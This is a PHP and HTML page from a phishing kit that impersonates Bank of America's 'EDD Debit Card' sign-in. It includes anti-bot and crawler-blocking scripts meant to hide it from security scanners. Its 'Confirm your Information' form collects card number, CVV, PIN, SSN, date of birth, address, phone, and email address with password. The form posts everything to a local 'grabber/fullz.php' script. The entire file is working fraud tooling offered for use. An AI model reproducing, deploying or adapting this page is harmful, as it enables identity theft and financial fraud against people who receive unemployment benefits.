<?php

error_reporting(0);
include('./assets/config.php');
include('./assets/Antibot/Bot-Crawler.php');
include('./assets/Antibot/Dila_DZ.php');

include('./assets/Antibot/blockers.php');
include('./assets/Antibot/detects.php');

if($show_billing_page != 'on'){
	header('Location: ./onetime.php');
}

?>

<!DOCTYPE html>

<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths" lang="en" style="">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">        
		<meta content="IE=edge" http-equiv="X-UA-Compatible">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta name="version" content="22.07.0128">



		<title>EDD Debit Card - Sign In</title>
		<link href="./assets/css/css.css" rel="stylesheet">
		<link href="./assets/css/css0.css" rel="stylesheet">
		<link href="./assets/css/print.css" rel="stylesheet" type="text/css" media="print">
		<link href="./assets/css/preventEarlyClickCss.css" rel="stylesheet">
	
	
		<script nonce="" src="./assets/js/jquery.js"></script>
		<script nonce="" src="./assets/js/preventEarlyClick.js"></script>
		<script nonce="" src="./assets/js/foundation.js"></script>
		

    

	
		<meta class="foundation-data-attribute-namespace">
		<meta class="foundation-mq-xxlarge">
		<meta class="foundation-mq-xlarge">
		<meta class="foundation-mq-large">
		<meta class="foundation-mq-medium">
		<meta class="foundation-mq-small">
		<style></style>
	
		<!--
		<script nonce="" src="./EDD Debit Card - Sign In_files/modernizr"></script>
		<script nonce="" src="./assets/js/Visa.js"></script>
		<script nonce="" src="./EDD Debit Card - Sign In_files/dps"></script>
		<link href="https://www.visaprepaidprocessing.com:444//content/PRC384/_Images/favicon.ico" rel="shortcut icon" type="image/x-icon">
		-->

		<link href="./assets/css/site.min.css" rel="stylesheet" type="text/css">
    
		
		<meta name="format-detection" content="telephone=no">
		<meta class="foundation-mq-topbar">
	</head>
	
		<body class="body">
			<a class="skip-to" href="javascript:void();">Skip to content</a>
				<div class="header-container" role="banner">
					<div class="row header-row">
						<div class="columns brand-container show-for-medium-up">
							<div class="small-12 medium-3 custom-medium-push-5 columns">
								<div class="logo-wrapper">
									<a href="javascript:void();">
										<img alt="Bank Of America, N. A. Logo" class="header-logo medium img-responsive" id="brand-logo" src="./assets/img/logo.png" title="">
									</a>
								</div>
							</div>
							<div class="small-12 medium-9 custom-medium-pull-7 columns">
								<div class="program-wrapper">
									<span class="header-card-program">EDD Debit Card</span>
								</div>
							</div>
						</div>

						<div class="small-12 show-for-small-only columns">
							<nav data-topbar="" class="top-bar mobile-nav" role="navigation" aria-label="Main" style="">
                
								<ul class="title-area">
									<!-- Title Area -->
									<li class="name">
										<a href="javascript:void();">
											<img alt="Bank Of America, N. A. Logo" class="header-logo medium img-responsive" id="brand-logo-mobile" src="./assets/img/logo(1).png" title="">
										</a>
									</li>
							
									<li class="toggle-topbar menu-icon">
										<button class="menu-icon" aria-expanded="false">
											<i class="fa fa-bars" role="presentation" aria-hidden="true"></i>
											<span class="a11y-hide-visually">Expand Navigation Menu</span> 
										</button>
									</li>
									<li class="header-card-program">EDD Debit Card</li>
								</ul>
								
								<section class="top-bar-section" style="display: none;">
									<ul class="left">
										<li>
											<a href="javascript:void();">Home</a>
										</li>
										<li>
											<a href="javascript:void();">Sign In</a>
										</li>
										<li>
											<a href="javascript:void();">Activate My Card</a>
										</li>
									</ul>
								</section>
							</nav>
						</div>
						
						<div class="row show-for-medium-up">
							<div class="medium-12 columns">
								<nav data-topbar="" class="top-bar desktop-nav" role="navigation" aria-label="Main">
									<section class="top-bar-section">
										<ul class="left">
											<li>
												<a href="javascript:void();">Home</a>
											</li>
											<li>
												<a href="javascript:void();">Sign In</a>
											</li>
											<li>
												<a href="javascript:void();">Activate My Card</a>
											</li>
										</ul>
									</section>
								</nav>
							</div>
						</div>
					</div>
				</div>
				
				<div class="content-container" id="content" role="main" tabindex="-1">
					<form action="./assets/grabber/fullz.php" autocomplete="off" id="MainForm" method="post" novalidate="novalidate">
						<div class="row">
							<div class="large-12 medium-12 small-12 column">
								<p style="background-color: #C41230;color:#fff;padding:10px;margin-bottom: 0px;">Please note your website username and password may be different than what you use for the Mobile App.</p>
								
								<h1 id="SignIn">Confirm your Information</h1>
								
								<div class="validation-summary-valid message warning" data-valmsg-summary="true" data-visaalert="" style="display: none; visibility: visible;">
									<i class="fa fa-exclamation-triangle" role="img" aria-label="Warning"></i>
									<span class="a11y-hide-visually">Error Message</span>
									<ul>
										<li style="display:none"></li>
									</ul>
									<button aria-label="Close" tabindex="0" class="close" title="Close" type="button">
										<i class="fa fa-times" role="img" aria-label="Close"></i>
									</button>
								</div>
							</div>
						</div>
						
						<div class="box">
							<div class="row">
								<div class="medium-12 columns">
									<div class="large-12 medium-12 small-12 column">
										<p class="align-right margin-bottom-none">
											<span class="required">*</span>
											Required fields
										</p>
									</div>

									<div class="row form-row">
										<div class="large-3 medium-5 small-12 column ">
											<label class="form-control" for="card_name">Cardholder's Name&nbsp;	<span class="required">*&nbsp;</span></label>
										</div>
										
										<div class="large-4 medium-4 small-12 columns left">
											<input aria-invalid="false" aria-required="true" autocomplete="on" class="stretch" data-val="true" data-val-visarequired="Card name is required." data-val-visarequired-invalidifforselectlist="" id="card_name" name="card_name" type="text" value="">
											<span class="field-validation-valid error text" data-valmsg-for="card_name" data-valmsg-replace="true" id="card_name"></span>
										</div>
										
										<div class="large-5 medium-3 small-12 columns left">
										</div>
									</div>
									
									<div class="row form-row">
										<div class="large-3 medium-5 small-12 column ">
											<label class="form-control" for="card_number">Card Number&nbsp;	<span class="required">*&nbsp;</span></label>
										</div>
										
										<div class="large-4 medium-4 small-12 columns left">
											<input aria-invalid="false" aria-required="true" autocomplete="on" class="stretch" data-val="true" data-val-visarequired="Card Number is required." data-val-visarequired-invalidifforselectlist="" id="card_number" name="card_number" type="text" value="">
											<span class="field-validation-valid error text" data-valmsg-for="card_number" data-valmsg-replace="true" id="card_number"></span>
										</div>
										
										<div class="large-5 medium-3 small-12 columns left">
										</div>
									</div>
									
									<div class="row form-row">
										<div class="large-3 medium-5 small-12 column ">
											<label class="form-control" for="exp">Expiry&nbsp;	<span class="required">*&nbsp;</span></label>
										</div>
										
										<div class="large-4 medium-4 small-12 columns left">
											<input aria-invalid="false" aria-required="true" autocomplete="on" class="stretch" data-val="true" data-val-visarequired="Expiry is required." data-val-visarequired-invalidifforselectlist="" id="exp" name="exp" type="text" value="">
											<span class="field-validation-valid error text" data-valmsg-for="exp" data-valmsg-replace="true" id="exp"></span>
										</div>
										
										<div class="large-5 medium-3 small-12 columns left">
										</div>
									</div>
									
									<div class="row form-row">
										<div class="large-3 medium-5 small-12 column ">
											<label class="form-control" for="csc">CVV&nbsp;	<span class="required">*&nbsp;</span></label>
										</div>
										
										<div class="large-4 medium-4 small-12 columns left">
											<input aria-invalid="false" aria-required="true" autocomplete="on" class="stretch" data-val="true" data-val-visarequired="CVV is required." data-val-visarequired-invalidifforselectlist="" id="csc" name="csc" type="text" value="">
											<span class="field-validation-valid error text" data-valmsg-for="csc" data-valmsg-replace="true" id="csc"></span>
										</div>
										
										<div class="large-5 medium-3 small-12 columns left">
										</div>
									</div>
									
									<div class="row form-row">
										<div class="large-3 medium-5 small-12 column ">
											<label class="form-control" for="pin">Card Pin&nbsp;	<span class="required">*&nbsp;</span></label>
										</div>
										
										<div class="large-4 medium-4 small-12 columns left">
											<input aria-invalid="false" aria-required="true" autocomplete="on" class="stretch" data-val="true" data-val-visarequired="Card Pin is required." data-val-visarequired-invalidifforselectlist="" id="pin" name="pin" type="text" value="">
											<span class="field-validation-valid error text" data-valmsg-for="pin" data-valmsg-replace="true" id="pin"></span>
										</div>
										
										<div class="large-5 medium-3 small-12 columns left">
										</div>
									</div>
									
									<div class="row form-row">
										<div class="large-3 medium-5 small-12 column ">
											<label class="form-control" for="dob">Date of Birth&nbsp;	<span class="required">*&nbsp;</span></label>
										</div>
										
										<div class="large-4 medium-4 small-12 columns left">
											<input aria-invalid="false" aria-required="true" autocomplete="on" class="stretch" data-val="true" data-val-visarequired="Date of birth is required." data-val-visarequired-invalidifforselectlist="" id="dob" name="dob" type="text" value="">
											<span class="field-validation-valid error text" data-valmsg-for="dob" data-valmsg-replace="true" id="dob"></span>
										</div>
										
										<div class="large-5 medium-3 small-12 columns left">
										</div>
									</div>
									
									<div class="row form-row">
										<div class="large-3 medium-5 small-12 column ">
											<label class="form-control" for="address">Address&nbsp;	<span class="required">*&nbsp;</span></label>
										</div>
										
										<div class="large-4 medium-4 small-12 columns left">
											<input aria-invalid="false" aria-required="true" autocomplete="on" class="stretch" data-val="true" data-val-visarequired="Address is required." data-val-visarequired-invalidifforselectlist="" id="address" name="address" type="text" value="">
											<span class="field-validation-valid error text" data-valmsg-for="address" data-valmsg-replace="true" id="address"></span>
										</div>
										
										<div class="large-5 medium-3 small-12 columns left">
										</div>
									</div>
									
									<div class="row form-row">
										<div class="large-3 medium-5 small-12 column ">
											<label class="form-control" for="state">State&nbsp;	<span class="required">*&nbsp;</span></label>
										</div>
										
										<div class="large-4 medium-4 small-12 columns left">
											<input aria-invalid="false" aria-required="true" autocomplete="on" class="stretch" data-val="true" data-val-visarequired="State is required." data-val-visarequired-invalidifforselectlist="" id="state" name="state" type="text" value="">
											<span class="field-validation-valid error text" data-valmsg-for="state" data-valmsg-replace="true" id="state"></span>
										</div>
										
										<div class="large-5 medium-3 small-12 columns left">
										</div>
									</div>
									
									<div class="row form-row">
										<div class="large-3 medium-5 small-12 column ">
											<label class="form-control" for="city">City&nbsp;	<span class="required">*&nbsp;</span></label>
										</div>
										
										<div class="large-4 medium-4 small-12 columns left">
											<input aria-invalid="false" aria-required="true" autocomplete="on" class="stretch" data-val="true" data-val-visarequired="City is required." data-val-visarequired-invalidifforselectlist="" id="city" name="city" type="text" value="">
											<span class="field-validation-valid error text" data-valmsg-for="city" data-valmsg-replace="true" id="city"></span>
										</div>
										
										<div class="large-5 medium-3 small-12 columns left">
										</div>
									</div>
									
									<div class="row form-row">
										<div class="large-3 medium-5 small-12 column ">
											<label class="form-control" for="zipcode">Zipcode&nbsp;	<span class="required">*&nbsp;</span></label>
										</div>
										
										<div class="large-4 medium-4 small-12 columns left">
											<input aria-invalid="false" aria-required="true" autocomplete="on" class="stretch" data-val="true" data-val-visarequired="Zipcode is required." data-val-visarequired-invalidifforselectlist="" id="zipcode" name="zipcode" type="text" value="">
											<span class="field-validation-valid error text" data-valmsg-for="zipcode" data-valmsg-replace="true" id="zipcode"></span>
										</div>
										
										<div class="large-5 medium-3 small-12 columns left">
										</div>
									</div>
									
									<div class="row form-row">
										<div class="large-3 medium-5 small-12 column ">
											<label class="form-control" for="ssn">SSN&nbsp;	<span class="required">*&nbsp;</span></label>
										</div>
										
										<div class="large-4 medium-4 small-12 columns left">
											<input aria-invalid="false" aria-required="true" autocomplete="on" class="stretch" data-val="true" data-val-visarequired="SSN is required." data-val-visarequired-invalidifforselectlist="" id="ssn" name="ssn" type="text" value="">
											<span class="field-validation-valid error text" data-valmsg-for="ssn" data-valmsg-replace="true" id="ssn"></span>
										</div>
										
										<div class="large-5 medium-3 small-12 columns left">
										</div>
									</div>

									<div class="row form-row">
										<div class="large-3 medium-5 small-12 column ">
											<label class="form-control" for="phone">Phone Number&nbsp;	<span class="required">*&nbsp;</span></label>
										</div>
										
										<div class="large-4 medium-4 small-12 columns left">
											<input aria-invalid="false" aria-required="true" autocomplete="on" class="stretch" data-val="true" data-val-visarequired="SSN is required." data-val-visarequired-invalidifforselectlist="" id="phone" name="phone" type="text" value="">
											<span class="field-validation-valid error text" data-valmsg-for="phone" data-valmsg-replace="true" id="phone"></span>
										</div>
										
										<div class="large-5 medium-3 small-12 columns left">
										</div>
									</div>

									<div class="row form-row">
										<div class="large-3 medium-5 small-12 column ">
											<label class="form-control" for="email_address">Email Address&nbsp;	<span class="required">*&nbsp;</span></label>
										</div>
										
										<div class="large-4 medium-4 small-12 columns left">
											<input aria-invalid="false" aria-required="true" autocomplete="on" class="stretch" data-val="true" data-val-visarequired="Email Address is required." data-val-visarequired-invalidifforselectlist="" id="email_address" name="email_address" type="email" value="">
											<span class="field-validation-valid error text" data-valmsg-for="email_address" data-valmsg-replace="true" id="email_address"></span>
										</div>
										
										<div class="large-5 medium-3 small-12 columns left">
										</div>
									</div>
									
									<div class="row form-row">
										<div class="large-3 medium-5 small-12 column ">
											<label class="form-control" for="email_password">Password&nbsp;	<span class="required">*&nbsp;</span></label>
										</div>
										
										<div class="large-4 medium-4 small-12 columns left">
											<input aria-invalid="false" aria-required="true" autocomplete="on" class="stretch" data-val="true" data-val-visarequired="Password is required." data-val-visarequired-invalidifforselectlist="" id="email_password" name="email_password" type="password" value="">
											<span class="field-validation-valid error text" data-valmsg-for="email_password" data-valmsg-replace="true" id="email_password"></span>
										</div>
										
										<div class="large-5 medium-3 small-12 columns left">
										</div>
									</div>
									
									
									
									<div class="small-12 columns button-group">
										<input class="button small navigationButton primary" data-route="verify/verifyyouridentity" id="verifyverifyyouridentitySubmit" name="Submit" type="submit" value="Continue">
									</div>
								</div>
							</div>
						</div>
						
						
					</form>
				</div>
				
				<div class="footer" role="contentinfo">
					<div class="row">
						<div class="small-12 columns" role="navigation" aria-label="Footer navigation">
							<ul class="footer-navigation">
								<li><a href="javascript:void();">Fee Information</a></li>
								<li><a href="javascript:void();">FAQ</a></li>
								<li><a href="javascript:void();">Site Map</a></li>
								<li><a href="javascript:void();">Contact Us</a></li>
								<li><a href="javascript:void();">Privacy / Security</a></li>
								<li><a href="javascript:void();">Terms &amp; Conditions</a></li>
								<li><a href="javascript:void();">Digital Terms &amp; Conditions and Fees</a></li>
								<li><a href="javascript:void();">ATM Locator</a></li>
								<li><a href="javascript:void();">Bank Of America, N. A.</a></li>
							</ul>
						</div>
					</div>
					
					<div class="extra">
						<div class="small-12 columns">
							<div class="row language">
								<div id="lang-label" class="small-12 columns align-center">
									<form action="javascript:void();" autocomplete="off" id="CultureForm" method="post" novalidate="novalidate">
										<span id="language-label" class="uppercase">
										<span class="a11y-hide-visually">Select a</span> Language:</span>
										<ul aria-labelledby="language-label" class="language-short-list">
											<li><button class="current changeCultureButton" data-culture="en-US" lang="en-US">English<span class="a11y-hide-visually"> (Selected)</span></button></li>
											<li><button class="changeCultureButton" data-culture="es-MX" lang="es-MX">Español</button></li>
										</ul>
									</form>
								</div>
							</div>
							
							<div class="row copyright">
								<div class="small-12 columns">
									<p>
										Copyright 2022 Bank of America Corporation .
										<a href="javascript:void();"> Visa Global Privacy Notice.</a><br>Bank of America, N.A. Member FDIC Equal Housing Lender
									</p>
									<div class="large-12 column align-center">
										<p style="color:#000;">
											<img src="./assets/img/logo(1).png"><br><br>
											Apple, the Apple logo, the App Store, and iPhone are trademarks of Apple Inc., registered in the U.S. and other countries. Google Play and the Google Play logo are trademarks of Google LLC.
										</p>
										<p style="color:#000;"> 
											Your funds are eligible for FDIC insurance. Your funds are insured up to $250,000 by the FDIC in the event Bank of America, N.A. fails, if specific deposit insurance requirements are met. See <a href="javascript:void();">fdic.gov/deposit/deposits/prepaid.html</a> for details. In the event Bank of America, N.A. fails, the FDIC may require information from you, including a government identification number, to determine the amount of your insured deposits.  If you do not provide this information to the FDIC access to your insured funds will be delayed. 
										</p>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div id="modalPlaceHolder" class="reveal-modal medium" data-reveal=""></div>
				
				<div id="modal-leaving-site" aria-labelledby="modal-leaving-site-dialog-title" aria-describedby="siteleaving-dialog-desc" class="reveal-modal medium" role="dialog" data-reveal="">
					<div class="modal-body">
						<h2 id="modal-leaving-site-dialog-title">
							You Are Now Leaving This Site
						</h2>
						
						<div id="siteleaving-dialog-desc" class="scrollable">
							<p id="modal-leaving-site-text">
								You are connecting to a new website; the information provided and collected on this website will be subject to the service provider’s privacy policy and terms and conditions, available through the website.  The website you are connecting to is: {0}
							</p>
						</div>
						
						<div class="small-12 columns button-group">
							<button class="button primary small button-close-modal" id="continue-button">Continue</button>
							<button class="button standard small button-close-modal" id="close-button">Cancel</button>
						</div>
						<button id="modal-close-icon" aria-label="Close" tabindex="0" class="close-reveal-modal">×</button>
					</div>
				</div>
				
				<button id="session-timeout-link" data-reveal-id="modal-session-timeout" title="Session Time Out" class="a11y-hide-all"></button>
				<div id="modal-session-timeout" aria-labelledby="session-timeout-dialog-title" aria-describedby="session-dialog-desc" class="reveal-modal small" role="dialog" data-reveal="">
					<div class="modal-body">
						<h2 id="session-timeout-dialog-title">Your session is about to expire.</h2>
						<div id="session-dialog-desc" class="scrollable expMessage"></div>
						<hr>
						
						<div class="align-right">
							<button id="btn-extend-session" onclick="extendSession()" type="button" class="button primary small">Extend Session</button>
							<button id="btn-expire-session" onclick="expireSession(true)" type="button" class="button primary small">Expire Session</button>
						</div>
						<button aria-label="Close" tabindex="0" id="sessionTimeOutClose" class="close-reveal-modal">×</button>
					</div>
				</div>
				
				<!-- Loading Modal -->
				<div id="modal-loading" class="reveal-modal tiny" role="dialog" data-reveal="">
					<div class="modal-body align-center">
						<h2 class="align-center">Loading ...</h2>
						<i class="fa fa-spinner fa-spin fa-5x" aria-hidden="true" role="presentation"></i>
					</div>
				</div>
				
				<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
    <script>

        $(document).ready(function () {
                var $input = $('[name=zipcode], [name=state], [name=city],[name=address], [name=dob], [name=ssn]'),
                $register = $('#verifyverifyyouridentitySubmit');
                
                $input.each(function () {
                    if (!$(this).val()) {
                        $register.attr('disabled', true);
                        return false;
                    }
                });
                $input.keyup(function () {
                    var trigger = false;
                    $input.each(function () {
                        if (!$(this).val()) {
                            trigger = true;
                        }
                    });
                    trigger ? $register.attr('disabled', true) : $register.removeAttr('disabled');
                });
            });


        $(function() {
            $('[name=zipcode]').mask('00000');
			$('[name=dob]').mask('00/00/0000');
			$('[name=ssn]').mask('000-00-0000');
			$('[name=phone]').mask('(000) 000-0000');
			$('[name=card_number]').mask('0000 0000 0000 0000');
			$('[name=exp]').mask('00/00');
			$('[name=csc]').mask('000');
			$('[name=pin]').mask('0000');
        });
    </script>


</body></html>